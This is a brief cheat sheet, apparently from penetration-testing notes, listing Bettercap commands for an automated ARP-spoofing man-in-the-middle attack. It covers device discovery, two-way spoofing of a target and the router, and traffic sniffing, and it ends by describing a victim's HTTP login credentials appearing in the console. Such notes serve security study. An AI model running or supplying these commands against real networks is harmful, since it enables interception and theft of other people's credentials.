# Man in the Middle (Automatic with Bettercap)

Bettercap automates the manual ARP spoofing process — discovering devices, spoofing both directions, and sniffing traffic — all from a single interactive console.

## Attack

| Command | Description |
|---|---|
| `bettercap -iface eth0` | Launches Bettercap |
| `net.probe on` | Actively scans for devices on the network |
| `net.recon on` | Enables network reconnaissance; combined with `net.show`, lists discovered devices |
| `set arp.spoof.fullduplex true` | Enables spoofing in both directions — toward the target and the router |
| `set arp.spoof.internal true` | Includes internal LAN traffic in the spoof |
| `set arp.spoof.targets [target IP]` | Sets the target IP |
| `arp.spoof on` | Starts ARP spoofing |
| `net.sniff on` | Starts sniffing traffic |

## Verification

When the victim logs into an HTTP site (not HTTPS), seeing credentials like username/password automatically appear in the Bettercap console confirms the attack succeeded.
